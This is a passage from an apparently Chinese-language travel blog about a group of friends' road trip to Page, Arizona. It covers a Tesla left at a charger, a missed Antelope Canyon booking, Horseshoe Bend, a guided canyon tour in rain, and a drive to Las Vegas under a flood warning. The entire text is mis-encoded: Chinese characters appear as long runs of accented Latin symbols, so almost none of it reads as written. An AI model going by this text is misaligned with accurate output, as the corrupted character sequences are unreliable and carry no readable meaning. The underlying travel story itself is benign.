ç‚ºæ²’æœ‰å¤šçš„ç©ºç“¶å¸¶å¸å¦æ¶²ï¼Œæ‰€ä»¥æˆ‘å¸¶äº†ä¸é˜²æ°´çš„é˜²æ›¬ï¼Œæ„å¤–ç™¼ç¾ä¸€å€‹å¥½è™•å°±æ˜¯å¾ˆå¥½åˆ†äº«çµ¦å¤§å®¶ï¼Œç•¢ç«Ÿåªè¦ç”¨æ°´å°±æ´—å¾—ä¹¾æ·¨ã€‚åœ¨æ“¦é˜²æ›¬çš„åŒæ™‚ï¼Œæˆ‘ä¸€ç›´å¾ˆæ‡·ç–‘é€™è£¡é€™éº¼ç†±ç‚ºä»€éº¼åŠ æ²¹ç«™ä¸æœƒçˆ†ç‚¸ã€‚ä½†æ­¤æ™‚æ­¤åˆ»ï¼Œæ¯”èµ·åŠ æ²¹ç«™çˆ†ç‚¸ï¼Œæ‰€æœ‰äººæ—©å°±ç™¼ç¾ä¸€å€‹æ›´æ‚²æ…˜çš„ç¾å¯¦â€”â€”ç¸±ä½¿æ˜¯é«˜é›„äººçš„è»Šé€Ÿï¼Œä¹Ÿç„¡æ³•è®“æˆ‘å€‘åœ¨ä¸‹åˆä¸‰é»åŠä¹‹å‰åˆ°é”ä½©å‰å¸‚ï¼Œé€™è¡¨ç¤ºæˆ‘å€‘å°‡éŒ¯éé å®šçš„å…¥å ´æ™‚é–“ã€‚åŒæ™‚ï¼ŒKaibro é‚„æ‰¾ä¸åˆ° 911 çš„é‘°åŒ™ï¼Œä¸€ç¾¤äººè‘—æ€¥çš„åœ¨è»Šå­ä¸Šæ‘¸ä¾†æ‘¸å»ï¼Œçµæœæˆ‘ä¸€å€‹ç®­æ­¥ä¸Šå‰ï¼Œå¾€åº§ä½ä¸‹é¢ä¸€æ‘¸å°±æ‘¸åˆ°äº†ï¼ŒçœŸæ˜¯å¹¸é‹æ˜Ÿã€‚æ¥ä¸‹ä¾†æ‰€æœ‰äººåœ¨ä¾¿åˆ©å•†åº—è£¡ä¸Šç¶²æŸ¥è©¢åŠæ‰“äº†å¹¾å€‹é›»è©±ä¹‹å¾Œï¼Œæˆ‘å€‘ç¢ºå®šä»Šå¤©åŠæ˜å¤©éƒ½æ²’æœ‰ç©ºä½å¯ä»¥è®“æˆ‘å€‘é€²å»ç¾šç¾Šå³½è°·ï¼Œé “æ™‚ï¼Œå¹¾å€‹æˆå¹´äººåœ¨ä¾¿åˆ©å•†åº—ç—›å“­æµæ¶•ã€ç„¡èƒ½ç‹‚å¼ï¼Œæ–¼æ˜¯å¤§å®¶æ±ºå®šæŠ±è‘—åº¦å‡çš„å¿ƒæƒ…åˆ°è¨‚å¥½çš„ Airbnb ç¡ä¸€æ™šï¼Œé †ä¾¿çœ‹çœ‹é™„è¿‘æœ‰æ²’æœ‰ä»€éº¼åœ°æ–¹å¥½ç©ï¼Œæœ€å°‘é‚„æœ‰é¦¬è¹„ç£å¯ä»¥å»ã€‚ åˆ°äº†ä¸‹å€‹ç‰¹æ–¯æ‹‰å……é›»é»ï¼Œæ­¤æ™‚å¤§æ¦‚ä¸‹åˆ 1:30ï¼Œç¶“éæ‰€æœ‰åœ¨å ´çš„é ‚å¤§è³‡å·¥ç³»èˆ‡è³‡ç®¡ç³»çš„ç¸å¯†è¨ˆç®—ï¼Œè¨ˆç®—çµæœé¡¯ç¤ºè·¯é€”ä¸Šçš„è¶…å……ç«™ç„¡æ³•è®“ Tesla Model 3 åˆ°é”ä½©å‰å¸‚ã€‚ä½¿ç”¨æ™®é€šå……é›»æ¨è®“å……é›»çš„æ™‚é–“è®Šå¾—éå¸¸çš„é•·ï¼Œå……é£½é›»è¦å…«å€‹å°æ™‚ï¼Œé‚£å¾—æ˜¯éš”å¤©çš„äº‹äº†ï¼Œä½†å¦‚æœä¸å……é£½è²¿ç„¶ä¸Šè·¯ï¼Œåœ¨å…¬è·¯ä¸Šæ²’é›»è‚¯å®šæ˜¯æ›´æ‚²åŠ‡ã€‚æ­¤æ™‚ Tesla è»Šä¸»æ‰“ç®—åŸåœ°æŠ˜è¿”ï¼Œè¦å¤§å®¶ä¸è¦ç®¡ä»–ç¹¼çºŒå‰é€²ï¼Œå‰é‚£ä¹‹é–“ï¼Œæˆ‘è…¦æµ·è£¡ä¸Šç™¾éƒ¨å‹•ç•«èˆ‡é›»å½±çš„æƒ…ç¯€åœ¨æ­¤æ™‚æ­¤åˆ»èˆ‡ç¾å¯¦é‡ç–Šï¼ŒDÃ©jÃ  vuã€‚åœ¨çœ¾äººçš„å …æŒä¸‹ï¼Œç§‰æŒè‘—ç‹é“åŠ‡æƒ…ä¸­ä¸€å€‹éƒ½ä¸èƒ½å°‘çš„è¨­å®šï¼Œæˆ‘å€‘æ±ºå®šåœ¨ä¸‹å€‹æ™®é€šå……é›»ç«™æ£„è»Šé€ƒé€¸æ”¾è‘—è®“ç‰¹æ–¯æ‹‰å……é›»ï¼Œå›ç¨‹å†æŠŠå®ƒé ˜å›ä¾†ï¼Œé€™æ¨£æˆ‘å€‘åªéœ€è¦åœ¨æœ€å¾Œçš„ 70 miles ç¨å¾®æ“ ä¸€ä¸‹ï¼Œèˆ‡å¤±å»æ—…ä¼´ç›¸æ¯”ä¼¼ä¹ä¹Ÿä¸é€™éº¼é›£ç†¬äº†ã€‚å‚·å¿ƒéå¾Œçš„ Kaibro é‚„æ˜¯ä¸å¿˜è¦æ‹ä¸€äº›ç…§ç‰‡æ”¾ Tinderã€‚ æ¥ä¸‹ä¾†å°±æ˜¯å¾€åœ°å¹³ç·šç„¡æ­¢ç›¡å»¶ä¼¸çš„é“è·¯ï¼Œä»»ä½•æ›¾ç¶“ç¯¤ä¿¡åœ°åœ“èªªçš„ç§‘å­¸å®¶è¡Œé§›åœ¨é€™æ¢è·¯ä¸Šéƒ½æœƒè®Šæˆåœ°å¹³èªªçš„æ“è­·è€…ã€‚æ­¤æ™‚å¤§æ¦‚æ˜¯ä¸‹åˆ 2:48ã€‚ ç¶“éäº†å…©å€‹å°æ™‚çš„è»Šç¨‹å¾Œï¼Œæˆ‘å€‘çµ‚æ–¼åˆ°äº†æ£„è»Šé»æ™®é€šå……é›»ç«™ï¼Œæˆ‘å€‘æ‰“ç®—åœ¨é€™è£¡åƒé»æ±è¥¿ç¨ä½œä¼‘æ¯ï¼Œæœ¬ä¾†æƒ³åƒ PizzaHutï¼Œä½†ç¶“éå¾Œé–€çš„æ™‚å€™çœ‹åˆ°ç†Ÿæ‚‰çš„é…è‰²å½·å½¿å–šèµ·äº†å¤§å®¶è¢« 217 æ”¯é…çš„æ·±é è¨˜æ†¶å› ç‚ºä¸èƒ½å¸¶å¤–é£Ÿï¼Œæ”¾è»Šä¸Šå¥½åƒæœƒå£æ‰ï¼Œæ‰€ä»¥åœ¨é™„è¿‘æ‰¾æ‰¾çœ‹é‚„æœ‰ä»€éº¼èƒ½åƒã€‚æ­¤æ™‚å¤§æ¦‚æ˜¯ä¸‹åˆ 3:30ã€‚ ä¸€å›é ­å°±ç™¼ç¾æ‹›ç‰Œä¸Šé‚£æ–—å¤§åˆä»¤äººæ‡·å¿µçš„è¡¨æ„æ–‡å­—ï¼Œæ­é…ä¸Šé“åœ°äºæ´²äººçš„å­—å‹ç¾å­¸ï¼Œè®“äººå¥½å¥‡æ˜¯ä»€éº¼æ»‹å‘³å¯ä»¥åœ¨é€™äººè·¡ç½•è¦‹çš„å…¬è·¯æ—å­˜æ´»ä¸‹ä¾†ã€‚ éºæ†¾çš„æ˜¯æˆ‘å€‘ä¾†æ™šäº†â€¦â€¦ä¾†è‡ªæ±æ–¹çš„ç¾å‘³ä¹Ÿç„¡æ³•åœ¨é€™ç‰‡æ²™æ¼ ä¸Šå¸¸é§ï¼Œåªå¥½å›é ­åƒé»æ´‹äººçš„ç©æ„å…’ã€‚åªèƒ½èªªè‡ªç”±ç¾åˆ©å …çš„åƒåœ¾é£Ÿç‰©çœŸçš„ç‰¹åˆ¥å¥½åƒã€‚ é‡æ–°ä¸Šè·¯å¾Œï¼Œå…¬è·¯ä¸Šçš„æ™¯è‰²å¾æ²™æ¼ æ¼¸æ¼¸è®Šæˆè½åŸï¼Œå‡ºç¾äº†ä¸€äº›äººé¡è±¢é¤Šçš„ç‰²ç•œã€‚ å¶çˆ¾é‚„æœƒçœ‹åˆ°ä¸€äº›å±±ï¼ˆæˆ–æ˜¯æ‡‰è©²å«åšå¤§å²©çŸ³ï¼‰ï¼Œè¢«æ¨™ä¸Šç¥ç§˜çš„è‹±æ–‡ã€‚jwang é–‹å§‹æ‹æ”é æ–¹æ¯å€‹å¸¶æœ‰å­—æ¯çš„å¤§å²©çŸ³ï¼Œå˜—è©¦æ”¶é½Šæ•´å€‹å­—æ¯è¡¨ï¼Œç›´åˆ°ä»Šå¤©ä»–çš„æŒ‘æˆ°éƒ½å°šæœªçµæŸã€‚ ä¸‹åˆ 5:40ï¼Œçµ‚æ–¼åˆ°äº†ä½©å‰å¸‚å¤–çš„éµæ©‹ï¼Œä¸‹é¢æ˜¯æ ¼è˜­å³½è°·å¤§å£©ï¼Œè‡ªç§çš„äººé¡é˜»æ–·äº†æ•´å€‹å¤§é™¸çš„æ°´æºï¼Œå¦‚æœæ²’æœ‰é€™å€‹å£©ï¼Œæˆ–è¨±æ­¤è™•å°±å†ä¹Ÿä¸æœƒæ˜¯æ²™æ¼ ã€‚å› ç‚ºæˆ‘ä¸æ•¢æŠŠæ‰‹ä¼¸å‡ºå»ï¼Œæ‰€ä»¥æˆ‘è¦å· Kaibro çš„ç…§ç‰‡ï¼š ä¸‹åˆ 6:26ï¼Œçµ‚æ–¼æŠŠè¡Œææ”¾åˆ° Airbnbï¼Œå¦‚æœä»¥ç‚ºé€™æ˜¯å¯ä»¥æ”¾é¬†çš„æ™‚å€™ï¼Œé‚£å¯å°±éŒ¯å¾—é›¢è­œã€‚ç•¶åœ°æ—¥è½æ™‚é–“ 7:28ï¼Œæˆ‘å€‘é‚„æœ‰ä¸€å€‹å°æ™‚å¯ä»¥å»é¦¬è¹„ç£æ‹ç…§ï¼Œè€Œä¸”åœè»Šè²»åªè¦ $10ã€‚ï¼ˆåœ–ä¸­ç‚ºä¸€åå®¢å®¶äººï¼‰ ä¸‹åˆ 6:47ï¼Œè»Šå­åœå¦¥å¾Œï¼Œæˆ‘å€‘é–‹å§‹æ­¥è¡Œå¾€é¦¬è¹„ç£èµ°å»ï¼Œå…¥å£è™•éå¸¸è²¼å¿ƒçš„å¹«å„ä½è¨ˆç®—äº†è¤‡é›œçš„é£²æ°´é‡å…¬å¼ã€‚ çµæœä¸€å€‹è€ç·´çš„æ”å½±å¸«æ—©å°±å®‰å¥½ä¸‰è…³æ¶åœ¨ä¸€å€‹å®Œç¾çš„åœ°é»ç¸®æ™‚æ”å½±ï¼Œæ²’æœ‰å¸¶å»£è§’é¡çš„æˆ‘åªèƒ½æ‹å‡ºæ²’æœ‰å¤©ç©ºæˆ–æ˜¯åˆ‡åˆ°æ²³é“çš„æ®˜ç¼ºç‰©ã€‚ç„¶è€Œ Apple æœç„¶é‚„æ˜¯æˆ‘å¤§å“¥ï¼ŒiPhone 12 Pro æ­è¼‰ 1200 è¬åƒç´ ç›¸æ©Ÿã€Æ’&#x2F;2.2 å…‰åœˆã€äººåƒæ¨¡å¼å…·å‚™å…ˆé€²çš„æ•£æ™¯æ•ˆæœåŠæ™¯æ·±æ§åˆ¶åŠŸèƒ½ã€äººåƒç‡ˆå…‰å…·å‚™å…­æ¬¾ä¸åŒæ•ˆæœ (è‡ªç„¶å…‰ã€å½±æ¨“ç‡ˆå…‰ã€è¼ªå»“å…‰ã€èˆå°ç‡ˆå…‰ã€é»‘ç™½èˆå°ç‡ˆå…‰ã€é«˜è‰²èª¿é»‘ç™½ç‡ˆå…‰)ã€å¯¬å»£è‰²åŸŸç›¸ç‰‡åŠåŸæ³ç›¸ç‰‡æ‹æ”ã€é¡é ­æ ¡æ­£ã€è‡ªå‹•å½±åƒé˜²éœ‡åŠŸèƒ½è®“ä½ è–„è–„ä¸€å°ä¹Ÿå¯ä»¥æ‹å‡ºå¦‚æ­¤æ™¯è‰²ï¼ˆåˆå· Kaibro çš„ç…§ç‰‡ï¼‰ï¼š åœ¨é€™è£¡æ™‚å¸¸å¯ä»¥çœ‹åˆ°ä¸€äº›äººèµ°åˆ°æ‡¸å´–é‚ŠæŠŠè…³ä¼¸å‡ºå»æ‹ç…§ã€ä¸€äº›äººåœ¨æ‡¸å´–é‚Šå€’ç«‹ï¼Œä¸æ„§æ˜¯è‡ªç”±ç¾åˆ©å …ï¼Œé€™è£¡çš„äººå€‘ç”šè‡³äº«æœ‰æ‘”è½æ‡¸å´–çš„è‡ªç”±ã€‚ç›®ç¹é€™ç•ªå…‰æ™¯çš„ä¸€ç¬é–“ï¼ŒBookgin çš„éˆæ„Ÿä¼¼ä¹è¢«æ¿€ç™¼äº†ï¼Œé–‹å§‹å‘æ‰€æœ‰äººæäº†ä¸€é“è²»ç±³å•é¡Œï¼šã€Œé€™è£¡æ¯å¹´æœ‰å¹¾å€‹äººæ‰ä¸‹å»ï¼Ÿã€æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥å˜—è©¦æ¨å°å¾Œå°‡ç­”æ¡ˆæ”¾åœ¨ç•™è¨€å€ï¼Œæˆ–è¨±æœƒæœ‰å·¥ä½œæ©Ÿæœƒæ‰¾ä¸Šä½ ã€‚ ç„¶å¾Œæˆ‘å€‘å°±åœ¨æ™¯é»çæ™ƒæ™ƒï¼Œæ‰¾äº†å€‹è·¯äººå¹«æˆ‘å€‘åˆç…§å¾Œï¼Œå¤©è‰²ä¹Ÿå·®ä¸å¤šæš—äº†ä¸‹ä¾†ï¼Œä»»ä½•æœ‰æ™ºæ…§çš„æ—¥è¡Œæ€§ç”Ÿç‰©éƒ½çŸ¥é“æ˜¯æ™‚å€™è¿”å›è‡ªå·±çš„å·¢ç©´äº†ã€‚ä½•æ³é™é çš„è¥¿æ–¹é‚„å¯ä»¥çœ‹åˆ°è‡ªç”±ç¾åˆ©å …æ‹¿è‘—å¾å¨œçƒè¥¿å¡é‚£è£¡æ¶ä¾†çš„å·¨ç¥å…µåœ¨æ²™æ¼ è£¡é€²è¡Œè‘—æ­¦å™¨å¯¦é©—æ‰€æ•£ç™¼å‡ºçš„ä¸ç¥¥ç´…å…‰ã€‚ å›ç¨‹çš„è·¯ä¸Šåœ¨éº¥ç•¶å‹åƒäº†å€‹æ™šé¤ï¼Œç‚ºäº†é€ƒé¿éº¥ç•¶å‹è£¡ç›æ ¼é­¯æ’’å…‹éœäººç•°æ¨£çš„çœ¼å…‰ï¼Œæˆ‘å€‘è¶•ç·Šæ”¶èµ·æ»¿å£çš„ä¸­æ–‡ï¼Œå›åˆ°äº† Airbnbï¼Œé€™ä¹Ÿç®—æ˜¯æ‹åˆ°ç¾šç¾Šå³½è°·äº†å§ã€‚ é›–ç„¶æˆ¿ä¸»èªª AC å£äº†å¹¾å°æœƒé€€é»éŒ¢çµ¦æˆ‘å€‘ï¼Œä½†å…¶å¯¦æ²™æ¼ æ™šä¸Šé‚„æ˜¯æŒºæ¶¼çš„ï¼Œè€Œä¸”æ²’ä»€éº¼èšŠèŸ²ï¼Œæ™šä¸Šåœ¨å¤–é ­èŠè‘—èŠè‘—å°±ç¡è‘—äº†ã€‚ï¼ˆæ™šä¸Šä¸å¥½æ‹ï¼Œåœ–ç‚ºéš”å¤©æ—©ä¸Šï¼‰ æœ€å¾Œç¡å‰å¤§å®¶åŒæ„æ˜æ—¥åŸ·è¡Œæˆ‘çš„ç„¡æ¥ææ¡ˆï¼Œå°±æ˜¯èµ·å€‹å¤§æ—©å»ç¾šç¾Šå³½è°·çš„å…¥å£è¹²é»ï¼Œçœ‹èª°é²åˆ°é‚„æ˜¯å–æ¶ˆå°±ç¾å ´å•å¯ä¸å¯ä»¥éè£œï¼Œç©©å¦¥ï¼åˆ·åˆ·ç‰™ç¡è¦ºï¼ï¼ˆä¸å¤ªè‚¯å®šæ‰€æœ‰äººéƒ½æœ‰åˆ·ç‰™ï¼‰ æ—©ä¸Šæ™‚é–“ 8:00ï¼Œæ—©èµ·æ‹äº†å¹¾å¼µåˆç…§å¾Œï¼Œçœ¾äººå°±å¾€ç¾šç¾Šå³½è°·çš„å”®ç¥¨å£å‰é€²ã€‚ éäº†åå¹¾åˆ†é˜çš„è»Šç¨‹æˆ‘å€‘çµ‚æ–¼ä¾†åˆ°äº†å”®ç¥¨å£ã€‚çµæœæ ¹æœ¬ä¸éœ€è¦è¹²é»ï¼Œåœ¨ç¾å ´çš„å°ç™½æ¿ä¸Šå°±å¯ä»¥ç™¼ç¾ 9:35 é‚„æœ‰ç©ºä½ï¼Œä½†æ„Ÿè¦ºæœ‰é»è¢«ååœ°èµ·åƒ¹ï¼Œç¾åœ¨æ¯å€‹äººè¦ \\$100ï¼Œä¸éä¾†éƒ½ä¾†äº†ï¼Œå°±ç®—ç¾åœ¨é–‹ \\$200 ä¹Ÿé‚„æ˜¯è¦å»ï¼Œé€™è£¡ä¸ä¾†æ•´è¶Ÿç™½ä¾†ã€‚ ä¸€å¦‚æ—¢å¾€çš„ï¼Œæ•´è¶Ÿè¡Œç¨‹çš„é‡è¦åˆ†æ”¯ä»»å‹™å°±æ˜¯å¹« Kaibro æ‹ Tinder ç…§ã€‚ ä¸å¾—ä¸æŠ±æ€¨æˆ‘æŠŠ Kaibro è·Ÿ Maojui æ‹å¾—é€™éº¼å¥½ã€‚ ç„¶è€Œæ˜æ˜æ˜¯åŒä¸€å°ç›¸æ©Ÿã€åŒä¸€å€‹ä½ç½®ã€åŒä¸€å€‹åƒæ•¸ï¼Œç‚ºä»€éº¼å°±æŠŠæˆ‘æ‹çš„é€™éº¼çŒ¥ç‘£ã€‚ ç¶“éäº†ä¸€å€‹å°æ™‚çš„ç­‰å¾…ï¼Œçµ‚æ–¼è¼ªåˆ°æˆ‘å€‘ä¸Šè»Šï¼Œå…¶å¯¦æ¯æ‰¹å‡ºå»çš„è»Šå­ç¸½æ•¸æŒºå¤šçš„ï¼Œæ¯å°è»Šå®¹é‡ç´„åäººï¼Œæ¯æ¬¡ç¸½è¨ˆå¯èƒ½æœ‰ä¸€ç™¾å¤šäººã€‚æ‰€æœ‰äººéƒ½ä¸èƒ½å¸¶èƒŒåŒ…ï¼ˆé€æ˜çš„å¯ä»¥ï¼‰ï¼Œæ‰€æœ‰æ±è¥¿éƒ½å¿…é ˆè¦è£åœ¨å£è¢‹ï¼Œç„¶å¾Œä¹Ÿç¦æ­¢å¸¶ç›¸æ©Ÿè…³æ¶ã€‚æ‡‰è©²æ˜¯ç‚ºäº†ä¿è­·ç•¶åœ°çš„è‡ªç„¶æ™¯è§€é‚„æœ‰é˜²æ­¢ä¸€äº›éŠå®¢æŠŠæ±è¥¿æ’¿å›å®¶çš„æªæ–½ã€‚ å‰å¾€å³½è°·çš„åœ°é¢æ˜¯æ²™å­ä¸”ç•°å¸¸é¡›ç°¸ï¼Œå°éŠä¸€é–‹å§‹å°±å«å¤§å®¶æŠŠæ‰‹æ©Ÿå¾å£è¢‹æ‹¿å‡ºä¾†æ¡åœ¨æ‰‹ä¸Šï¼Œå› ç‚ºè¡Œè»Šéç¨‹ä¸­æœƒç›´æ¥å¾å£è¢‹æ»‘ä¸‹è»Šã€‚è€Œä¸”çœŸçš„å¥½éšªæˆ‘ä¸€ä¸Šè»Šå°±æŠŠå®‰å…¨å¸¶ç¹«å¥½äº†ï¼Œæ•´å°è»Šæ™ƒåˆ°æœƒæ‰€æœ‰äººéƒ½å¾æ¤…å­ä¸Šå½ˆèµ·ä¾†ã€‚ éäº†å¤§æ¦‚ååˆ†é˜æˆ‘å€‘çµ‚æ–¼ä¾†åˆ°äº†å³½è°·çš„å…¥å£ï¼Œé€™è£¡å·²ç¶“æ˜¯ç´ç“¦éœæ—äººçš„ä¿ç•™åœ°ï¼Œæ­¤æ™‚æ­¤åˆ»æ²’æœ‰äººç™¼ç¾ï¼Œæˆ‘å³è…³é‚£éš»å¾ä¸‰æœˆå°±å·²ç¶“ç ´äº†æ´çš„é‹å­æ­£åœ¨ç›œå–ä¸Šç¾šç¾Šå³½è°·çš„ç ‚çŸ³ï¼Œæ²¾é»åœ¨è¥ªå­ä¸Šçš„ç´…è‰²ç ‚çŸ³è®“æˆ‘çœ‹èµ·ä¾†åƒæ˜¯æ²¾æ»¿èŠ±ç²‰çš„èœœèœ‚ã€‚å…¥å£è™•é‚„ç®—æœ‰è¶³å¤ çš„å…‰ç·šï¼Œé€™è£¡éƒ½éå¸¸å¥½æ‹ï¼Œå°éŠå‘Šè¨´æˆ‘å€‘å¹¾å€‹å¾€ä¸Šçœ‹æ‹èµ·ä¾†æœ€æ¼‚äº®çš„é»ï¼Œä»–ç¨±é€™è£¡æ˜¯ sky windowã€‚ å°éŠå€‘åŸºæœ¬ä¸Šæ˜¯å…¨å‰¯æ­¦è£ï¼Œå¸½å­ã€å¢¨é¡è·Ÿé®æ©å£é¼»çš„ä¸‰è§’å·¾æ˜¯æ¨™é…ï¼Œåæ­£æˆ‘å€‘é€™ç¨®åªä¾†ä¸€æ¬¡çš„è§€å…‰å®¢åƒé»æ²™å­æ‡‰è©²ä¹Ÿä¸æœƒé€ æˆä»€éº¼å‚·å®³å°±æ˜¯äº†ã€‚ï¼ˆåœ–ç‚ºå¾Œé¢é‚£å°è»Šçš„å°éŠï¼‰ åœ¨è·é›¢å…¥å£ä¸é è™•ï¼Œå°éŠæŒ‡è‘—é™„è¿‘å‚ç›´å²©å£ä¸Šçš„ä¸€äº›åœ“å½¢å‡¹é™·å•æˆ‘å€‘è¦ºå¾—é€™äº›æ±è¥¿æ˜¯æ€éº¼é€ æˆçš„ã€‚æœ¬ä¾†æƒ³èªªæ˜¯é•·æœŸé¢¨å¹ç ‚ç¤«æˆ–çŸ³é ­æ’æ“Šå²©å£é€ æˆçš„ï¼Œä½†ä»–èªªé€™æ˜¯å¾ˆä¹…ä»¥å‰çš„å½ˆå­”ï¼Œä¸æ„§æ˜¯è‡ªç”±ç¾åˆ©å …ï¼Œæ§æ“Šæ¯ä¸€å¤©ã€‚ éš¨è‘—æ…¢æ…¢æ·±å…¥å³½è°·ä¹‹å¾Œï¼Œå› ç‚ºå‚ç›´æœ›å‘å¤©ç©ºçš„æ™¯è§€å°è‡´å‹•æ…‹ç¯„åœå¾ˆé«˜ä¸å¥½æ‹æ”ä¹‹å¤–ï¼Œæ‰‹æŒç›¸æ©Ÿå¿«é–€ä¹Ÿä¸å¯èƒ½é–‹å¤šä¹…ï¼Œè€Œä¸”é‚„æœƒçœ©å…‰ï¼Œé ­ä¸Šé‚„æœƒæ™‚ä¸æ™‚æ‰æ²™å­ä¸‹ä¾†ï¼ŒçœŸçš„é›£ã€‚ æœ¬ä¾†ä»¥ç‚ºè®€å®Œå®‰å¾·é­¯â€§è·¯ç±³æ–¯çš„ã€Šç•«å®¶ä¹‹çœ¼ã€‹å¾Œè‡ªå·±å°æ–¼ç¾æœ‰è‘—ç¨ç‰¹çš„è§€å¯Ÿèˆ‡è¦‹è§£ã€‚ä½†æ˜¯å¾Œä¾†ç™¼ç¾å¤§å®¶å¥½åƒéƒ½æ‹å·®ä¸å¤šçš„åœ°æ–¹ï¼Œåœ¨çœ‹å…±ç”¨ç›¸ç°¿é‚„æœ‰ google çš„æ™‚å€™ç™¼ç¾é€™å€‹è§’åº¦è¶…å¤šäººæ‹ã€‚ èµ°åœ¨å³½è°·è£¡ï¼Œå¤§æ¦‚è…°éƒ¨ä»¥ä¸‹çš„ä½ç½®éƒ½ç± ç½©åœ¨é™°å½±è£¡ï¼Œé›–ç„¶ä¸è‡³æ–¼çœ‹ä¸åˆ°ï¼Œä½†å°±åƒé—œç‡ˆåœ¨æˆ¿é–“è£¡èµ°è·¯ï¼Œç¸½æœƒä¸Ÿå¤±ä¸€äº›ç´°ç¯€ï¼›åˆ°é”ä¸€å€‹å®šé»å¾Œï¼Œå°éŠçªç„¶æ‹¿èµ·ä»–çš„æ‰‹é›»ç­’å¾€è…³é‚Šçš„ä¸€å€‹åœ°æ–¹ç…§å»ï¼Œä¸€å€‹é»‘è‰²ç”Ÿç‰©çªç„¶é¡¯ç¾â€”â€”æ“šèªªæ˜¯æ•´å€‹å³½è°·è£¡å”¯ä¸€ä¸€éš»é»‘å¯¡å©¦ï¼Œç•¶ä¸‹åªè¦ºå¾—è¦æ˜¯æˆ‘æ‰‹è³¤äº‚æ‘¸å¯èƒ½æ—©å°±è¢«å’¬æˆäºæ´²èœ˜è››äººï¼Œè€Œä¸”è§€å¯Ÿå¾Œç™¼ç¾ï¼Œä¸æ˜¯æ¯å€‹å°éŠéƒ½æœ‰æåˆ°è…³é‚Šæœ‰é»‘å¯¡å©¦é€™ä»¶äº‹ã€‚ èµ°è‘—èµ°è‘—ï¼Œå°éŠèªªäº†æ›´å¤šé—œæ–¼ç¾šç¾Šå³½è°·çš„æ•…äº‹ã€‚ä¾‹å¦‚é€™è£¡å¶çˆ¾æœƒæœ‰è²“é ­é·¹æˆ–æ˜¯æ›¾ç¶“æœ‰å€‹ 12 äººçš„åœ˜é«”åœ¨é€™è£¡è¢«æ´ªæ°´æ·¹æ­» 11 å€‹äººï¼Œå”¯ä¸€ä¸€å€‹æ²’æ­»çš„å°±èº²åœ¨é€™å¡Šå‡¸èµ·çš„åœ°æ–¹ä¸Šï¼Œæ‰€ä»¥ç­‰ç­‰å¦‚æœä¸‹é›¨æˆ‘å€‘å°±è¦é–‹å§‹è·‘äº†ï¼ŒçœŸæ˜¯å¯æ€•ï¼Œå¥½éšªæ²™æ¼ æ‡‰è©²æ²’æœ‰å¤©å¤©åœ¨ä¸‹é›¨çš„ã€‚é€™éº¼æƒ³å°±å¤§éŒ¯ç‰¹éŒ¯äº†ï¼Œå› ç‚ºé€™å€‹å­£ç¯€å·®ä¸å¤šæ˜¯é›¨å­£ï¼Œéäº†ä¸€æœƒå…’å°±çœŸçš„é–‹å§‹ä¸‹é›¨äº†ï¼Œæˆ‘å€‘ç”šè‡³å¯ä»¥åœ¨å³½è°·è£¡è½åˆ°æ‰“é›·è²ï¼Œé›–ç„¶æˆ‘å€‘é‚„æ˜¯åœ¨é‚Šèµ°é‚Šæ‹ç…§ï¼Œç„¶å¾Œè©¦è©¦çœ‹å¿«é–€èª¿å¤šå¿«æ‰èƒ½æ‹åˆ°è½ä¸‹çš„é›¨æ»´ï¼Œæˆ‘é€¢äººå°±èªªï¼šã€ŒYouâ€™re a dead manã€‚ã€éš¨è‘—é›¨å‹¢æ¼¸å¤§ï¼Œå¾Œé¢çš„åœ˜é«”å› ç‚ºæœ‰å°æœ‹å‹çš„é—œä¿‚ï¼Œç‚ºäº†é¿å…ç™¼ç”Ÿå±éšªå°±åŸè·¯æŠ˜è¿”äº†ã€‚å°±ç®—å³½è°·ç›®å‰çš„é›¨å‹¢ä¸å¤§é‚£ä¹Ÿä¸ä»£è¡¨æ˜¯å®‰å…¨çš„ï¼Œå› ç‚ºæ´ªæ°´æ˜¯å¾ä¸Šæ¸¸ä¸‹ä¾†çš„ï¼Œç­‰çœ‹åˆ°æ°´ä¾†çš„æ™‚å€™å·²ç¶“å¯ä»¥æƒ³ä¸‹è¼©å­çš„äº‹äº†ã€‚æˆ‘å€‘æ˜¯æœ€å¾Œä¸€çµ„èµ°å‡ºå³½è°·çš„äººï¼Œèµ°ä¸Šäº†å³½è°·å¤–çš„éšæ¢¯çˆ¬ä¸Šäº†åœ°å‹¢è¼ƒé«˜çš„åœ°æ–¹ï¼Œçµ‚æ–¼æ„Ÿè¦ºæ¯”è¼ƒå®‰å…¨ä¸€é»ã€‚é‚£å¯åˆå¤§éŒ¯ç‰¹éŒ¯äº†ï¼Œè¸©åœ¨ä¸€æœ›ç„¡éš›çš„æ› é‡ä¸Šï¼Œé ­é ‚çš„é›²å±¤é›·é›»äº¤åŠ ï¼Œæˆ‘å€‘æœ€å¥½æ˜¯å¿«é»ä¸‹å»æ­è»Šï¼Œé¿å…ä¸‹ä¸€è²é›·éŸ¿çš„æ™‚å€™å¤šäº†é»ç„¦é¦™ã€‚ è¸©è‘—æ²¾æ»¿æ³¥æ²™çš„é‹å­ä¸Šè»Šå¾Œï¼Œé¡§ä¸å¾—å¼„é«’åœ°å¢Šè¦å¤šæ”¶æ¸…æ½”è²»ï¼Œæˆ‘å€‘é–‹å§‹å•Ÿç¨‹å¾€æ‹‰æ–¯ç¶­åŠ æ–¯å‰é€²ï¼Œä¸ç„¶æœƒè¶•ä¸ä¸Šé‚„è»Šçš„æ™‚é–“ï¼ä½†æš´é›¨çµ²æ¯«æ²’æœ‰è¦åœæ­¢çš„æ„æ€ï¼Œå›ç¨‹çš„è·¯ä¸Šé›¨å‹¢å¤§åˆ°çœ‹ä¸åˆ°å°å‘ä¾†è»Šçš„è»Šç‡ˆï¼Œè€Œæ²æ¶¼çš„é›¨æ°´ä¼¼ä¹ä¹Ÿå®‰å®šäº† Bookgin çš„éˆé­‚ï¼Œä»–ç¾åœ¨åªè·Ÿè‘—å‰è»Šçš„å±è‚¡èµ°ã€‚ å›ç¨‹é€”ä¸­ç”šè‡³æ”¶åˆ°äº†è‡ªç”±ç¾åˆ©å …åœ‹å®¶ç´šçš„æ­»äº¡å¨è„…ã€‚ä»€éº¼ä»€éº¼æ´ªæ°´è­¦å ±ï¼Œä»€éº¼ä»€éº¼ Do not attempt to travelï¼Œä½†æˆ‘å€‘æ˜¯å¾€è¶Šä¾†è¶Šä¹¾çš„åœ°æ–¹é–‹ï¼Œå¤§æ¦‚æ²’å•é¡Œå§ã€‚ 